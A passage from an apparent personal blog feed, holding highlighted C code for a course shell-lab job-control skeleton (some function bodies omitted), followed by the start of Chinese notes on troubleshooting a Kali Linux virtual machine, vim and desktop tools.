class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">fgpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">int</span> jid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pid2jid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unix_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">app_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handler_t</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">handler_t</span> *<span class="hljs-title">Signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">handler_t</span> *handler)</span></span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * main - The shell&#x27;s main routine </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> c;<br>    <span class="hljs-keyword">char</span> cmdline[MAXLINE];<br>    <span class="hljs-keyword">int</span> emit_prompt = <span class="hljs-number">1</span>; <span class="hljs-comment">/* emit prompt (default) */</span><br><br>    <span class="hljs-comment">/* Redirect stderr to stdout (so that driver will get all output</span><br><span class="hljs-comment">     * on the pipe connected to stdout) */</span><br>    dup2(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">/* Parse the command line */</span><br>    <span class="hljs-keyword">while</span> ((c = getopt(argc, argv, <span class="hljs-string">&quot;hvp&quot;</span>)) != EOF)<br>    &#123;<br>        <span class="hljs-keyword">switch</span> (c)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>: <span class="hljs-comment">/* print help message */</span><br>            usage();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>: <span class="hljs-comment">/* emit additional diagnostic info */</span><br>            verbose = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p&#x27;</span>:            <span class="hljs-comment">/* don&#x27;t print a prompt */</span><br>            emit_prompt = <span class="hljs-number">0</span>; <span class="hljs-comment">/* handy for automatic testing */</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            usage();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* Install the signal handlers */</span><br><br>    <span class="hljs-comment">/* These are the ones you will need to implement */</span><br>    Signal(SIGINT, sigint_handler);   <span class="hljs-comment">/* ctrl-c */</span><br>    Signal(SIGTSTP, sigtstp_handler); <span class="hljs-comment">/* ctrl-z */</span><br>    Signal(SIGCHLD, sigchld_handler); <span class="hljs-comment">/* Terminated or stopped child */</span><br><br>    <span class="hljs-comment">/* This one provides a clean way to kill the shell */</span><br>    Signal(SIGQUIT, sigquit_handler);<br><br>    <span class="hljs-comment">/* Initialize the job list */</span><br>    initjobs(jobs);<br><br>    <span class="hljs-comment">/* Execute the shell&#x27;s read/eval loop */</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br><br>        <span class="hljs-comment">/* Read command line */</span><br>        <span class="hljs-keyword">if</span> (emit_prompt)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, prompt);<br>            fflush(<span class="hljs-built_in">stdout</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="hljs-built_in">stdin</span>) == <span class="hljs-literal">NULL</span>) &amp;&amp; ferror(<span class="hljs-built_in">stdin</span>))<br>            app_error(<span class="hljs-string">&quot;fgets error&quot;</span>);<br>        <span class="hljs-keyword">if</span> (feof(<span class="hljs-built_in">stdin</span>))<br>        &#123; <span class="hljs-comment">/* End of file (ctrl-d) */</span><br>            fflush(<span class="hljs-built_in">stdout</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* Evaluate the command line */</span><br>        eval(cmdline);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">/* control never reaches here */</span><br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * parseline - Parse the command line and build the argv array.</span></span><br><span class="hljs-comment"><span class="hljs-function"> * </span></span><br><span class="hljs-comment"><span class="hljs-function"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="hljs-comment"><span class="hljs-function"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="hljs-comment"><span class="hljs-function"> * the user has requested a FG job.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">parseline</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cmdline, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * builtin_cmd - If the user has typed a built-in command then execute</span></span><br><span class="hljs-comment"><span class="hljs-function"> *    it immediately.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function">    </span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*****************</span></span><br><span class="hljs-comment"><span class="hljs-function"> * Signal handlers</span></span><br><span class="hljs-comment"><span class="hljs-function"> *****************/</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     available zombie children, but doesn&#x27;t wait for any other</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     currently running children to terminate.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* </span></span><br><span class="hljs-comment"><span class="hljs-function"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="hljs-comment"><span class="hljs-function"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="hljs-comment"><span class="hljs-function"> *    to the foreground job.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*</span></span><br><span class="hljs-comment"><span class="hljs-function"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="hljs-comment"><span class="hljs-function"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="hljs-comment"><span class="hljs-function"> */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/*********************</span></span><br><span class="hljs-comment"><span class="hljs-function"> * End signal handlers</span></span><br><span class="hljs-comment"><span class="hljs-function"> *********************/</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/***********************************************</span></span><br><span class="hljs-comment"><span class="hljs-function"> * Helper routines that manipulate the job list</span></span><br><span class="hljs-comment"><span class="hljs-function"> **********************************************/</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">/* clearjob - Clear the entries in a job struct */</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clearjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *job)</span></span><br><span class="hljs-function"></span>&#123;<br>    job-&gt;pid = <span class="hljs-number">0</span>;<br>    job-&gt;jid = <span class="hljs-number">0</span>;<br>    job-&gt;state = UNDEF;<br>    job-&gt;cmdline[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* initjobs - Initialize the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">initjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        clearjob(&amp;jobs[i]);<br>&#125;<br><br><span class="hljs-comment">/* maxjid - Returns largest allocated job ID */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">maxjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, max = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].jid &gt; max)<br>            max = jobs[i].jid;<br>    <span class="hljs-keyword">return</span> max;<br>&#125;<br><br><span class="hljs-comment">/* addjob - Add a job to the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">addjob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid, <span class="hljs-keyword">int</span> state, <span class="hljs-keyword">char</span> *cmdline)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == <span class="hljs-number">0</span>)<br>        &#123;<br>            jobs[i].pid = pid;<br>            jobs[i].state = state;<br>            jobs[i].jid = nextjid++;<br>            <span class="hljs-keyword">if</span> (nextjid &gt; MAXJOBS)<br>                nextjid = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">strcpy</span>(jobs[i].cmdline, cmdline);<br>            <span class="hljs-keyword">if</span> (verbose)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Added job [%d] %d %s\n&quot;</span>, jobs[i].jid, jobs[i].pid, jobs[i].cmdline);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tried to create too many jobs\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* deletejob - Delete a job whose PID=pid from the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">deletejob</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>        &#123;<br>            clearjob(&amp;jobs[i]);<br>            nextjid = maxjid(jobs) + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* fgpid - Return PID of current foreground job, 0 if no such job */</span><br><span class="hljs-function"><span class="hljs-keyword">pid_t</span> <span class="hljs-title">fgpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].state == FG)<br>            <span class="hljs-keyword">return</span> jobs[i].pid;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* getjobpid  - Find a job (by PID) on the job list */</span><br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobpid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>            <span class="hljs-keyword">return</span> &amp;jobs[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">/* getjobjid  - Find a job (by JID) on the job list */</span><br><span class="hljs-function">struct <span class="hljs-keyword">job_t</span> *<span class="hljs-title">getjobjid</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs, <span class="hljs-keyword">int</span> jid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (jid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].jid == jid)<br>            <span class="hljs-keyword">return</span> &amp;jobs[i];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">/* pid2jid - Map process ID to job ID */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pid2jid</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>        <span class="hljs-keyword">if</span> (jobs[i].pid == pid)<br>        &#123;<br>            <span class="hljs-keyword">return</span> jobs[i].jid;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* listjobs - Print the job list */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">listjobs</span><span class="hljs-params">(struct <span class="hljs-keyword">job_t</span> *jobs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAXJOBS; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (jobs[i].pid != <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) &quot;</span>, jobs[i].jid, jobs[i].pid);<br>            <span class="hljs-keyword">switch</span> (jobs[i].state)<br>            &#123;<br>            <span class="hljs-keyword">case</span> BG:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Running &quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> FG:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Foreground &quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> ST:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stopped &quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;listjobs: Internal error: job[%d].state=%d &quot;</span>,<br>                       i, jobs[i].state);<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, jobs[i].cmdline);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/******************************</span><br><span class="hljs-comment"> * end job list helper routines</span><br><span class="hljs-comment"> ******************************/</span><br><br><span class="hljs-comment">/***********************</span><br><span class="hljs-comment"> * Other helper routines</span><br><span class="hljs-comment"> ***********************/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * usage - print a help message</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">usage</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: shell [-hvp]\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -h   print this message\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -v   print additional diagnostic information\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   -p   do not emit a command prompt\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * unix_error - unix-style error routine</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unix_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s: %s\n&quot;</span>, msg, strerror(errno));<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * app_error - application-style error routine</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">app_error</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Signal - wrapper for the sigaction function</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">handler_t</span> *<span class="hljs-title">Signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">handler_t</span> *handler)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">action</span>, <span class="hljs-title">old_action</span>;</span><br><br>    action.sa_handler = handler;<br>    sigemptyset(&amp;action.sa_mask); <span class="hljs-comment">/* block sigs of type being handled */</span><br>    action.sa_flags = SA_RESTART; <span class="hljs-comment">/* restart syscalls if possible */</span><br><br>    <span class="hljs-keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Signal error&quot;</span>);<br>    <span class="hljs-keyword">return</span> (old_action.sa_handler);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigquit_handler - The driver program can gracefully terminate the</span><br><span class="hljs-comment"> *    child shell by sending it a SIGQUIT signal.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigquit_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Terminating after receipt of SIGQUIT signal\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CS</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux使用</title>
    <link href="/2021-05/linux%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2021-05/linux%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="Kali的问题"><a href="#Kali的问题" class="headerlink" title="Kali的问题"></a>Kali的问题</h2><blockquote><p>linux<a href="https://www.runoob.com/linux/linux-command-manual.html">命令</a>在这</p></blockquote><ul><li><p>虚拟机的安装(又装了一遍)</p></li><li><p>VMtools的安装(为什么网上会有这么多的<a href="https://blog.csdn.net/love20165104027/article/details/83377758">方法</a>.</p></li><li><p>中文输入法Ibus的<a href="https://www.cnblogs.com/donghao0924/p/13503595.html">安装(</a>两行命令解决的事情有些教程搞得几十行,就离谱)</p></li><li><p>vim插件(彻底的失败) 不过在vim设置文件里设置了几个<a href="https://blog.csdn.net/lovewebeye/article/details/79960675">常用的</a>.</p></li><li><p>密码问题, root初始密码忘记, root下passwd指令.   默认账号kali kali</p></li><li><p>vim在share文件夹里</p></li><li><p>中文输入法出现[Invalid-UTF-8 code], 改成半角中文即可</p></li><li><p>make btest出错, 修改Makefile为生成64位可执行文件<a href="https://blog.csdn.net/mazamu/article/details/107021054">[0]</a>.</p></li><li><p>LInux中可执行文件和后缀名无关, 和文件的属性有关(????</p></li><li><p>bitset是一个类模板</p></li><li><p>GDB以及gcc的<a href="https://zhuanlan.zhihu.com/p/74897601">使用</a>(详见零碎知识)</p></li><li><p>kali如何运行可执行文件: ./bomb</p></li><li><p>set nohlsearch(no highlight search)</p></li><li><p>中文输入法下输入命令:w按下回车vim会卡死, <strong>输入逗号也能卡死?????</strong></p></li><li><p>kali装Chrome:他有sandbox机制, 无法在root用户下运行<a href="https://www.cnblogs.com/smart-zihan/p/13440084.html">[1]</a>.</p></li><li><p>kali使用vpn:  <strong>失败</strong>.</p></li><li><p>kill占了端口的进程<a href="https://blog.csdn.net/weixin_42108437/article/details/106072810">[0]</a>.</p></li><li><p>虚拟机卡死时查找log文件里的pid, 在任务管理器里停止</p></li><li><p>查看磁盘使用情况<a href="https://www.cnblogs.com/flyingeagle/articles/9219106.html">[0]</a>.</p></li><li><p>Typora的安装<a href="https://blog.csdn.net/qq_33694648/article/details/104403618">问题</a>.</p></li><li><p>.tar文件相关<a href="https://zhidao.baidu.com/question/873537413743808372.html">问题</a>.</p></li><li><p>root用户安装了vmtool, 切换到lbjyye后需要重新安装(?)</p></li><li><p>修改命令行终端字体大小: ~/.config/qterminal.org/qterminal.ini 里的fontsize或fontfamily并将其改为只读文件(<strong>新版完全没这个问题</strong>)</p></li><li><p>要显示隐藏文件夹直接到工具栏上的视图里去找</p></li><li><p><a href="https://blog.csdn.net/Cappuccino_jay/article/details/105474581">延长</a>锁屏时间</p></li><li><p>终端补全只要方向键</p></li><li><p>关机命令 init 0 重启 reboot</p></li><li><p>chorme里<a href="https://jingyan.baidu.com/article/75ab0bcb8547fed6864db2f8.html">添加</a>搜索引擎</p></li><li><p>vim无法打开文件, <a href="https://blog.csdn.net/qq_38238114/article/details/78524043">改为</a>下载GVIM</p></li><li><p>啥玩意儿啊, kali2021干吗搞没了图形界面clash弄半天也没成<a href="https://dcrelay.me/#/knowledge">[0]</a></p></li><li><p>main函数的两个参数: 一个是命令参数的个数, 另一个是命令参数数组,argv[0]是程序本身的文件名</p></li><li><p>快照管理其中的保留是防止自动保存的快照被删除</p></li><li><p>**Typora里使用中文状态下的Ctrl+A, 文件直接丢失!!!!**太特么蠢了.</p></li><li><p>/usr/share/vim/vim82/colors/有vim的主题</p><ul><li>industry 全黑,  evening 还行, koel 超级黑的背景, morning 灰白很不错, murpy又是黑的字体细点,  peachpuff 桃色背景, shine 亮瞎狗眼 颜色太浅, slate 字体太紧, zellner 平平无奇的白底, 剩下的不用考虑</li></ul></li><li><p>了解了链接引用和脚注是个<a href="https://www.cnblogs.com/hnrainll/p/3514637.html">啥</a>.</p></li><li><p>Operation inconsistent with current state。VM报错, 只要以管理员身份运行就可以了</p></li><li><p>Linux中的Chrome无法自动升级,干脆就不升级了, 命令加一个<code>--disable-background-networking</code> </p></li><li><p>kali中使用中文输入法的时候无法在vscode中用光标选中文本</p></li><li><p>vim进阶</p><ul><li><a href="https://www.cnblogs.com/wajika/p/6606353.html">vim可视化模式选择</a> </li></ul><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">选择： <br><span class="hljs-keyword">vi</span>选中&#123;&#125;中间的内容,不包括&#123;&#125;<br>va&#123; 